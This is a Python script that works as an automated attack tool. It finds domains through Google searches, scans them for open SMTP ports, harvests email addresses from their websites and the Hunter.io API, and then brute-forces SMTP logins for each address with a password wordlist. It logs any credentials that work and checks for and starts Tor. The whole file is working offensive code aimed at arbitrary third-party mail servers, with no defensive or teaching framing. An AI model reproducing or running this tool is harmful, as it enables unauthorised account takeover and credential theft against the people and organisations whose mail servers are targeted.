import socket
import requests
import re
import time
import subprocess
import ssl
import smtplib
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import random


try:
    from googlesearch import search
except ImportError:
    print("[!] Install googlesearch-python using: pip install googlesearch-python")
    exit()


def check_smtp_port(domain, ports=[25, 465, 587], timeout=5):
    open_ports = []
    for port in ports:
        try:
            sock = socket.create_connection((domain, port), timeout=timeout)
            sock.close()
            open_ports.append(port)
        except (socket.timeout, socket.error):
            continue
    return open_ports


def extract_emails(url, max_depth=2, visited=None):
    if visited is None:
        visited = set()
    emails = set()

    if url in visited or max_depth == 0:
        return emails
    visited.add(url)

    try:
        response = requests.get(url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')

        email_pattern = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
        emails.update(re.findall(email_pattern, soup.get_text()))

        links = [a['href'] for a in soup.find_all('a', href=True) if a['href'].startswith('http')]
        for link in links[:5]:
            emails.update(extract_emails(link, max_depth - 1, visited))
    except Exception as e:
        print(f"[-] Failed to extract from {url}: {e}")

    return emails


def hunter_io_emails(domain, api_key):
    emails = set()
    if not api_key:
        return emails

    url = f"https://api.hunter.io/v2/domain-search?domain={domain}&api_key={api_key}"
    try:
        response = requests.get(url)
        response.raise_for_status()
        data = response.json()
        if 'data' in data and 'emails' in data['data']:
            emails.update(email['value'] for email in data['data']['emails'])
    except Exception as e:
        print(f"[-] Hunter.io API error: {e}")

    return emails


def check_tor():
    try:
        subprocess.check_call(["pgrep", "-x", "tor"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except subprocess.CalledProcessError:
        print("[!] Tor is not running. Starting Tor...")
        subprocess.Popen(["sudo", "systemctl", "start", "tor"])


def detect_auth_methods(domain, port):
    try:
        context = ssl.create_default_context()
        if port == 465:
            server = smtplib.SMTP_SSL(domain, port, context=context, timeout=10)
        else:
            server = smtplib.SMTP(domain, port, timeout=10)
            server.starttls(context=context)

        server.ehlo()
        auth_methods = server.esmtp_features.get('auth', '').split()
        server.quit()

        return auth_methods if auth_methods else ['PLAIN', 'LOGIN']
    except Exception as e:
        print(f"[-] Could not detect auth methods for {domain}:{port} - {e}")
        return []

def smtp_bruteforce(domain, email, wordlist, port, log_file):
    auth_methods = detect_auth_methods(domain, port)
    if not auth_methods:
        log_file.write(f"[-] No authentication methods detected for {domain}:{port}. Skipping.\n")
        return

    print(f"[*] Brute-forcing {domain}:{port} for {email} with auth methods: {auth_methods}")
    with open(wordlist, 'r') as f:
        passwords = [line.strip() for line in f.readlines()]

    attempt_count = 0
    max_attempts = 3  # Set the maximum number of connection attempts before moving to the next domain

    for password in passwords:
        try:
            context = ssl.create_default_context()
            if port == 465:
                server = smtplib.SMTP_SSL(domain, port, context=context, timeout=10)
            else:
                server = smtplib.SMTP(domain, port, timeout=10)
                server.starttls(context=context)

            server.ehlo()
            for method in auth_methods:
                try:
                    print(f"[*] Trying {email}:{password} on {domain}:{port} with {method}")
                    server.login(email, password)
                    print(f"[+] Success: {email}:{password} on {domain}:{port} with {method}")
                    log_file.write(f"[+] Success: {email}:{password} on {domain}:{port} with {method}\n")
                    server.quit()
                    return
                except smtplib.SMTPAuthenticationError:
                    pass  # Continue if authentication fails
            server.quit()

        except (smtplib.SMTPConnectError, smtplib.SMTPException, Exception) as e:
            attempt_count += 1
            print(f"[-] Error connecting to {domain}:{port} - {e}")
            log_file.write(f"[-] Error connecting to {domain}:{port} - {e}\n")

            # Check if max attempts are reached
            if attempt_count >= max_attempts:
                print(f"[-] Maximum connection attempts reached for {domain}:{port}. Moving to next one.")
                log_file.write(f"[-] Maximum connection attempts reached for {domain}:{port}. Moving to next one.\n")
                return  # Move to the next domain or password attempt
        time.sleep(random.uniform(0.2, 1.3))




# Correct function to handle scanning and brute force

def google_search_and_scan(query, num_results, hunter_api_key, wordlist, log_file):
    smtp_servers_found = []
    print(f"[*] Searching Google with query: '{query}' for {num_results} results...\n")
    visited_domains = set()

    try:
        for result in search(query, stop=num_results):
            parsed_url = urlparse(result)
            domain = parsed_url.netloc
            if not domain:
                print(f"[-] Skipping invalid result: {result}")
                continue
            if domain in visited_domains:  # Skip domains already processed
                print(f"[-] Skipping already processed domain: {domain}")
                continue

            print(f"[*] Checking {domain} for open SMTP ports...")
            open_ports = check_smtp_port(domain)

            if open_ports:
                print(f"[+] Open SMTP ports found on {domain}: {open_ports}")
                site_emails = extract_emails(result)
                hunter_emails = hunter_io_emails(domain, hunter_api_key)
                all_emails = site_emails.union(hunter_emails)

                if all_emails:
                    print(f"[*] Emails found on {domain}: {all_emails}")
                    # Perform Hydra brute-force attacks for each email on open SMTP ports
                    for email in all_emails:
                        for port in open_ports:
                            smtp_bruteforce(domain, email, wordlist, port, log_file)
                else:
                    print(f"[-] No emails found on {domain}.")
                smtp_servers_found.append((domain, open_ports, all_emails))
            else:
                print(f"[-] No open SMTP ports found on {domain}.")
                visited_domains.add(domain)
            
            time.sleep(2)  # Avoid rate limits
    except KeyboardInterrupt:
        print("\n[!] Script interrupted by user. Exiting...")
        return smtp_servers_found
    except Exception as e:
        print(f"[-] Error during search or scanning: {e}")

    return smtp_servers_found


def read_queries_from_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]


if __name__ == "__main__":
    file_path = input("Enter path to search query file: ").strip()
    search_queries = read_queries_from_file(file_path)
    num_results = 65
    hunter_api_key = input("Enter your Hunter.io API key (optional): ").strip()
    wordlist = input("Enter path to wordlist: ").strip()

    with open("smtp_search_log.txt", "w") as log_file:
        for query in search_queries:
            google_search_and_scan(query, num_results, hunter_api_key, wordlist, log_file)
        print("[*] Scan complete. Check smtp_search_log.txt for details.")
